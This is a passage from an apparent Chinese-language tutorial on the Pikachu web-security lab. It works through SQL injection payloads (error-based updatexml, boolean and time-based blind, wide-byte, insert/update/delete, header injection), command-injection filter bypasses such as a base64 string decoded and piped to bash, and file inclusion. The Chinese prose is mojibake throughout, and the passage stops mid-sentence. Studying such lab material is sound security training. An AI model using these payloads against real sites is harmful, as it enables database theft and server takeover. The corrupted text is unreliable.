ï¼šå®é™…æ˜¯å°†å…¶é€šé…ç¬¦%é—­åˆï¼Œ</p><p>egï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xx%<span class="hljs-string">&#x27; or 1=1 #   </span><br><span class="hljs-string"></span><br><span class="hljs-string">ä¼ åˆ°åç«¯çš„å®Œæ•´è¯­å¥ä¸ºï¼šselect id form æŸè¡¨ like &#x27;</span> %xx%<span class="hljs-string">&#x27; or 1=1 #% &#x27;</span><br><br><span class="hljs-string">&#x27; and 1=1 and &#x27;</span>%<span class="hljs-string">&#x27;=&#x27;</span><br><br>ä¼ åˆ°åç«¯çš„å®Œæ•´è¯­å¥ä¸ºï¼š<span class="hljs-keyword">select</span> id form æŸè¡¨ <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;%&#x27;</span>=<span class="hljs-string">&#x27;%&#x27;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ï¼šâ€™ and 1=1 and â€˜%â€™=â€™</p><p>æ­¤æ—¶åç«¯æŸ¥è¯¢è¯­å¥ä¸ºï¼šselect name form æŸè¡¨ like â€˜%â€™ and 1=1 and â€˜%â€™=â€™%â€™;likeåçš„å€¼éƒ½ä¸º1ï¼Œæ•…å›æ˜¾å‡ºæ­¤è¡¨çš„æ‰€æœ‰ç»“æœ</p><p><img src="https://i.loli.net/2021/02/13/S2U5GDwlEnyYvM7.png"></p><p>è¿™é‡Œæ²¡æœ‰å›æ˜¾ä½ï¼Œç›²æ³¨ä¸€ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kob<span class="hljs-string">e&#x27; and length(database())=7 ##æ­£å¸¸å›æ˜¾,æ•°æ®åº“é•¿åº¦ä¸º7</span><br><span class="hljs-string">kobe&#x27;</span> <span class="hljs-keyword">and</span> ord(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">112</span> #<br>ord()è¿”å›æ‹¬å·å†…å­—ç¬¦çš„asiiç ï¼›substr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®ï¼Œå­—ç¬¦æ•°ç›®)<br></code></pre></td></tr></table></figure><p>burpsuiteä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/14/YLkPq2fuAZr6UFK.png"></p><p>112 105 107 97 99 104 117   =ã€‹ p i k a c h u</p><h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h2><p>tip:ç®¡tmdçš„ä»€ä¹ˆå‹,èƒ½å¤Ÿåˆ¶é€ å‡ºé—­åˆ,å°±æ˜¯æœ¬äº‹</p><p>payload:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">name</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/HI5VlwvXSx4zM9a.png"></p><h2 id="insert-updateæ³¨å…¥"><a href="#insert-updateæ³¨å…¥" class="headerlink" title="insert/updateæ³¨å…¥"></a>insert/updateæ³¨å…¥</h2><p>insertè¯­å¥ï¼šåœ¨æ•°æ®åº“ä¸­æ·»åŠ æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ä¸¤ç§å½¢å¼ï¼š<br>1.INSERT...VALUESï¼š<br>insert into &lt;è¡¨å&gt; [&lt;åˆ—å1&gt; [ , ...&lt;åˆ—ån&gt;]]<br>values (å€¼1) [... , (å€¼n) ];<br><br>2.INSERT...SETï¼š<br>insert into &lt;è¡¨å&gt;<br>set &lt;åˆ—å1&gt; &#x3D; &lt;å€¼1&gt;<br>&lt;åˆ—å2&gt; &#x3D; &lt;å€¼2&gt;<br>...;<br></code></pre></td></tr></table></figure><p>updateè¯­å¥ï¼šä¿®æ”¹ã€æ›´æ–°æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update &lt;è¡¨å&gt; set å­—æ®µ 1 &#x3D; å€¼ 1 [,å­—æ®µ 2 &#x3D; å€¼ 2â€¦ ] [where å­å¥ ]<br>[order by å­å¥] [limit å­å¥];<br></code></pre></td></tr></table></figure><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>æ³¨å†Œé¡µé¢</p><p><img src="https://i.loli.net/2021/02/14/oUadxHfnustVOGp.png"></p><p>åˆ™çŒœæµ‹åç«¯è¯­å¥ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into æŸè¡¨  (username,password,sex,phonenumber,address,home?) values (&#39;xxx&#39;,&#39;xxx&#39;,&#39;xxx&#39;,xxx,&#39;xxx&#39;,&#39;xxx&#39;);<br></code></pre></td></tr></table></figure><p>xxxå³ä¸ºæˆ‘ä»¬è¾“å…¥çš„å€¼ï¼Œå­˜åœ¨æŠ¥é”™ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">xxx&#39; or (select updatexml(1,concat (0x7e,(select database()),0x7e),1)) or &#39;<br>xxx&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;<br><br>å› ä¸ºå­˜åœ¨ä¸¤ä¸ªå¿…å¡«é¡¹ï¼Œå¿…é¡»åœ¨æœ«å°¾åŠ &#39;æ„é€ é—­åˆï¼Œä½¿å¾—æŠ¥é”™ä¸æ˜¯è¯­æ³•é”™è¯¯<br></code></pre></td></tr></table></figure><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p><img src="https://i.loli.net/2021/02/14/AqXZrg4VyFERtKG.png"></p><p>çŒœæµ‹åç«¯è¯­å¥ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update æŸè¡¨ set sex &#x3D; &#39;xxx&#39;, phone &#x3D; &#39;xxx&#39;, add &#x3D; &#39;xxx&#39;, email &#x3D; &#39;xxx&#39; where name &#x3D;&#39;123&#39;;<br></code></pre></td></tr></table></figure><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$link</span>=connect();<br><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæ²¡æœ‰ç™»å½•ä¸èƒ½è®¿é—®</span><br><span class="hljs-keyword">if</span>(!check_sqli_session(<span class="hljs-variable">$link</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•åæ‰èƒ½è¿›å…¥ä¼šå‘˜ä¸­å¿ƒå“¦&#x27;)&lt;/script&gt;&quot;</span>;<br>    header(<span class="hljs-string">&quot;location:sqli_login.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$html1</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phonenum&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;add&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]!=<span class="hljs-literal">null</span>)&#123;<br><span class="hljs-comment">//        $getdata=escape($link, $_POST);</span><br><br>        <span class="hljs-comment">//æœªè½¬ä¹‰,å½¢æˆæ³¨å…¥,sqlæ“ä½œç±»å‹ä¸ºupdate</span><br>        <span class="hljs-variable">$getdata</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;update member set sex=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="hljs-subst">&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span>=execute(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);<br>        <span class="hljs-keyword">if</span>(mysqli_affected_rows(<span class="hljs-variable">$link</span>)==<span class="hljs-number">1</span> || mysqli_affected_rows(<span class="hljs-variable">$link</span>)==<span class="hljs-number">0</span>)&#123;<br>            header(<span class="hljs-string">&quot;location:sqli_mem.php&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$html1</span>.=<span class="hljs-string">&#x27;ä¿®æ”¹å¤±è´¥ï¼Œè¯·é‡è¯•&#x27;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ„é€ æŠ¥é”™å‹æ³¨å…¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#39; or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/E8g23vRF1aOd6Km.png"></p><p><img src="https://i.loli.net/2021/02/14/9kFpNlBRWiQqsKu.png"></p><h2 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h2><p>deleteè¯­å¥ï¼šåˆ é™¤æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from &lt;è¡¨å&gt; [where å­å¥] [order by å­å¥] [limit å­å¥]<br></code></pre></td></tr></table></figure><p>ç‚¹å‡»åˆ é™¤=ã€‹ä¼ å‚ä½œä¸ºåˆ é™¤çš„ç­›é€‰æ¡ä»¶</p><p>çŒœæµ‹åç«¯ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from æŸè¡¨ where id &#x3D; xxx<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/k4DNhlxXSQ9arbd.png"></p><p>å¯ä»¥çœ‹åˆ°å‚æ•°ï¼š<code>id=62</code></p><p>åœ¨å…¶ååŠ ä¸Špayloadå³å¯~(æ­¤å¤„ä»ä¸ºæŠ¥é”™æ³¨å…¥)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #<br></code></pre></td></tr></table></figure><p>æ³¨ï¼špayloadéœ€è¿›è¡Œhtmlç¼–ç =ã€‹é€‰ä¸­ç„¶åctrl+uå³å¯</p><p><img src="https://i.loli.net/2021/02/14/mwJIPvWHoMFy68Z.png"></p><h2 id="httpå¤´æ³¨å…¥"><a href="#httpå¤´æ³¨å…¥" class="headerlink" title="httpå¤´æ³¨å…¥"></a>httpå¤´æ³¨å…¥</h2><p>httpå¤´æ³¨å…¥çš„åŸç†æ˜¯å‰ç«¯è·å–å‚æ•°å€¼ï¼Œç„¶åå°†å‚æ•°æ‹¼æ¥åˆ°selectè¯­å¥ä¸­æŸ¥è¯¢ã€‚å³ä¸æ•°æ®åº“äº§ç”Ÿäº¤äº’ã€‚</p><p>è‘—éœ€è¦æ‰¾åˆ°httpå¤´ä¸­ä¼ å‚çš„åœ°æ–¹ï¼Œå°†payloadè¾“å…¥å³å¯</p><p>å¦‚å›¾ï¼šæ˜¾ç¤ºå¤´éƒ¨ä¿¡æ¯user-agentã€accept</p><p><img src="https://i.loli.net/2021/02/14/Fb2GILVsH9SKB5M.png"></p><p>payload(æ­¤å¤„ä»æ˜¯æŠ¥é”™æ³¨å…¥)ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xxx</span>&#x27; or (select updatexml(<span class="hljs-number">1</span>,concat (<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)) or &#x27;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/lUASyjYzIXb7B3J.png"></p><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>å¸ƒå°”å³trueä¸falseï¼›ç»“æœæ­£ç¡®ä¸é”™è¯¯æ˜¾ç¤ºçš„é¡µé¢ä¸åŒï¼Œåˆ™çŒœæµ‹æœ‰å¸ƒå°”æ³¨å…¥</p><p>åˆ¤æ–­ï¼šè¾“å…¥kobeæ­£å¸¸å›æ˜¾ï¼Œè¾“å…¥kobeâ€™ and 1# æ­£å¸¸å›æ˜¾kobeä¿¡æ¯ï¼›è¾“å…¥kobeâ€™ and 0#  ä¸å­˜åœ¨</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">kobe&#39; and length(database())&#x3D;7# <br>kobe&#39; and ord(substr(database(),1,1))&#x3D;112# <br>#burpsuiteè·‘ä¸€ä¸‹å³å¯ï¼Œæ¶ˆæ¯æ“ä½œçœ‹æœç´¢å‹æ³¨å…¥éƒ¨åˆ†<br></code></pre></td></tr></table></figure><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>åˆ©ç”¨<code>sleep()</code>æˆ–<code>benchmark()</code>ç­‰å‡½æ•°ä½¿å¾—å‘½ä»¤æ‰§è¡Œæ—¶é—´å˜é•¿ï¼Œä¸<code>if(expr1,expr2,expr3)</code>æ­é…ä½¿ç”¨çŒœè§£æ•°æ®åº“</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">kobe&#39; and if (length ( database() ) &#x3D;7 , sleep(5) , 1) #<br>kobe&#39; and if (ord(substr(database(),1,1))&#x3D;112 , sleep(5) , 1) #<br></code></pre></td></tr></table></figure><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>é€‚ç”¨ï¼šå•å¼•å·è¢«åæ–œæ è½¬ä¹‰&amp;&amp;æ•°æ®åº“ä½¿ç”¨GBKç¼–ç (PHPä¸­é€šè¿‡iconv()è¿›è¡Œç¼–ç è½¬æ¢ä¹Ÿå¯èƒ½å­˜åœ¨å®½å­—èŠ‚å­—ç¬¦æ³¨å…¥)</p><blockquote><p>eg:<br>æ¯”å¦‚è¾“å…¥çš„idè¢« â€˜åŒ…å›´ï¼Œè¾“å…¥id=1â€™ï¼Œç¨‹åºä¸æŠ¥é”™ï¼Œä½†ä¼šå¤šå‡ºä¸€ä¸ªåæ–œæ (id= â€˜1&#39;â€˜)ï¼Œæ­¤æ—¶è¾“å…¥çš„å•å¼•å·è¢«åæ–œæ è½¬ä¹‰ï¼Œä»è€Œå¯¼è‡´è¾“å…¥çš„å•å¼•å·æ— æ³•å½¢æˆé—­åˆã€‚é€šå¸¸è¿™ç§æƒ…å†µä¸‹æ­¤å¤„æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ã€‚<br>ä½†æ•°æ®åº“æŸ¥è¯¢å‰æ‰§è¡Œäº†SET NAMES â€˜GBKâ€™è¯­å¥ï¼Œä¼šå°†ç¼–ç è®¾ç½®ä¸ºå®½å­—èŠ‚GBKã€‚é€ æˆæ­¤å¤„çš„å®½å­—èŠ‚æ¼æ´ã€‚</p></blockquote><p>åŸç†ï¼šåæ–œæ ç¼–ç ä¸º<code>%5c</code>ï¼ŒGBKç¼–ç ä¸­<code>%df%5c</code>ä¸ºç¹ä½“å­—<code>é‹</code>,ç”±æ­¤å¯ç»•è¿‡åæ–œæ è½¬ä¹‰ </p><p>åˆ©ç”¨ï¼šå®½å­—èŠ‚<code>%df</code>åŠ <code>&#39;</code></p><p><img src="https://i.loli.net/2021/02/14/c4a8OsJQV3nrCYb.png"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCEå³remote command/code executeè®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><p>ä»¥ä¸‹æ‘˜è‡ª<a href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTFä¸‹çš„å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹æ³•æ€»ç»“</a></p><p>ç®¡é“ç¬¦ï¼š</p><p>windowsï¼š<code>| </code>ã€<code>||</code> ã€<code>&amp;</code>ã€<code>&amp;&amp;</code></p><p>linuxï¼šç›¸æ¯”windowså¤šäº†ä¸€ä¸ª<code>;</code>,æ•ˆæœåŒ<code>&amp;</code></p><p><code>|</code>ï¼šç›´æ¥æ‰§è¡Œ<code>|</code>åçš„è¯­å¥</p><p><img src="https://i.loli.net/2021/02/14/fPMCoi2vwrZLqEG.png"></p><p><code>||</code> : å–å†³äº<code>||</code>å‰çš„å‘½ä»¤æ­£ç¡®ä¸å¦ï¼šæ­£ç¡® =ã€‹åªæ‰§è¡Œå‰é¢çš„è¯­å¥ï¼›é”™è¯¯ =ã€‹æ‰§è¡Œåé¢çš„è¯­å¥</p><p><img src="https://i.loli.net/2021/02/14/Lnb3di6JRCX1ewO.png"></p><p><code>&amp;</code>ï¼š<code>&amp;</code>å‰åçš„å‘½ä»¤éƒ½æ‰§è¡Œï¼Œæ— è®ºå‰è€…æ˜¯å¦æ­£ç¡®</p><p><img src="https://i.loli.net/2021/02/14/YkzPoEb6XSRrUiQ.png"></p><p><code>&amp;&amp;</code>ï¼š<code>&amp;&amp;</code>å‰å‘½ä»¤ä¸ºå‡åˆ™éƒ½ä¸æ‰§è¡Œï¼Œä¸ºçœŸåˆ™éƒ½æ‰§è¡Œ</p><p><img src="https://i.loli.net/2021/02/14/5a1YThQz7Kj3GpN.png"></p><p>bypassï¼š</p><p>è¿‡æ»¤ç©ºæ ¼bypassï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">1.</span><span class="hljs-template-variable">&#123;IFS&#125;</span><br><span class="xml">2.<span class="hljs-tag">&lt;&gt;</span></span><br><span class="xml">3.PHPç¯å¢ƒä¸‹%09</span><br></code></pre></td></tr></table></figure><p>é»‘åå•bypassï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">æ‹¼æ¥ï¼ša=c;b=at;c=fl;d=ag;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><br>ç¼–ç ï¼šY2F0IGZsYWc= å³ cat flag<br>echo <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br>`echo <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d`<br>å•ã€åŒå¼•å·ï¼šc<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag<br>åæ–œçº¿ï¼šc\at fl\ag<br><span class="hljs-variable">$1</span>ã€<span class="hljs-variable">$2</span>...ä»¥åŠ<span class="hljs-variable">$@</span>:c<span class="hljs-variable">$1at</span> fl<span class="hljs-variable">$@ag</span><br>å†…è”æ‰§è¡Œç»•è¿‡ï¼š`å‘½ä»¤`å’Œ$(å‘½ä»¤)éƒ½æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼<br>echo <span class="hljs-string">&quot;xx`pwd`&quot;</span><br>echo <span class="hljs-string">&quot;xx$(pwd)&quot;</span><br>é€šé…ç¬¦ç»•è¿‡ï¼šä»¥ä¸‹æŒ‡ä»¤ç­‰åŒ <span class="hljs-regexp">/bin/</span>cat flag<br><span class="hljs-regexp">/???/</span>?[a][t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-regexp">/???/</span>?at flag<br><span class="hljs-regexp">/???/</span>?at ????<br><span class="hljs-regexp">/???/</span>?[a]<span class="hljs-string">&#x27;&#x27;</span>[t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ›´å¤šçš„å†…å®¹çœ‹è¿™é‡Œ=&gt;<a href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTFä¸‹çš„å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹æ³•æ€»ç»“</a></p><h2 id="execâ€pingâ€"><a href="#execâ€pingâ€" class="headerlink" title="execâ€pingâ€"></a>execâ€pingâ€</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">127.0.0.1</span> | whoami<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/M9k8h3ZyaPz5DBN.png"></p><h2 id="execâ€evelâ€"><a href="#execâ€evelâ€" class="headerlink" title="execâ€evelâ€"></a>execâ€evelâ€</h2><p>eval()å‡½æ•°å±å®³æå¤§ï¼Œç”šè‡³å¯ä»¥ç›´æ¥æ‹¿shell</p><p><img src="https://i.loli.net/2021/02/14/9JUbsZ4PAxjdXF2.png"></p><p><img src="https://i.loli.net/2021/02/14/NYsG9ku7M8IWQ1H.png"></p><h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><blockquote><p>æ¦‚è¿°ï¼š</p><p>File inclusion æ–‡ä»¶åŒ…å«ï¼šåœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚</p><p>PHPä¸­ï¼Œæä¾›äº†ï¼š<br>include(),include_once()<br>require(),require_once()</p><p>å½“æ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p></blockquote><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p>åç«¯ä»£ç é€šè¿‡include()ï¼ŒåŒ…å«æœ¬åœ°æ–‡ä»¶è¾“å‡ºå†…å®¹ï¼Œå…¶å‚æ•°ç”±GETä¼ å…¥ï¼Œå¯ä»¥ä»»æ„æ§åˆ¶åŒ…å«çš„æ–‡ä»¶</p><p>ç¯å¢ƒè¦æ±‚ï¼šallow_url_fopen=On</p><p><img src="https://i.loli.net/2021/02/14/14SRghwUCQpM8yO.png"></p><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>ç½‘ç«™é”™è¯¯çš„å°†ç¯å¢ƒé…ç½®æ‰“å¼€<code>allow_url_include=On</code>(é»˜è®¤å…³é—­)ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ï¼Œæ”»å‡»è€…æ­å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼Œé€šè¿‡PHPä»£ç å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œgetshellã€‚</p><p>ç¯å¢ƒè¦æ±‚ï¼šallow_url_fopen=On ã€allow_url_include=On</p><p>å°†æ–‡ä»¶ä¸Šä¼ åˆ°æŸç½‘ç«™ä¸Šç„¶åå¤åˆ¶è·¯å¾„åˆ°å‚æ•°å³å¯</p><p><img src="https://i.loli.net/2021/02/14/vuKoXnGd5lTkpCS.png"></p><h1 id="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h1><p>ç½‘ç«™æä¾›æ–‡ä»¶ä¸‹è½½åŠŸèƒ½,ç”¨æˆ·ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œå°†æ–‡ä»¶è·¯å¾„ä¼ ç»™åå°è¿›è¡Œå¤„ç†ï¼Œå½“æ–‡ä»¶ä¸‹è½½åŠŸèƒ½è®¾è®¡ä¸å½“,åˆ™å¯èƒ½å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ 